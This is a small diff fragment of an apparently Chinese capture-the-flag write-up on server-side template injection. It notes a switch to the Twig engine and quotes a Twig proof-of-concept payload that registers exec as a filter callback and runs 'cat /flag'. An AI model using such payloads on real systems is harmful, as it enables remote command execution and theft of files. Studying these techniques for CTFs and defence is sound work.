@@ -17,6 +17,7 @@ Poc:``{{system("<cmd>")}}``
 渲染引擎也换成了Twig
 
 从网上找到的 Twig poc
+
 ```
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
 ```
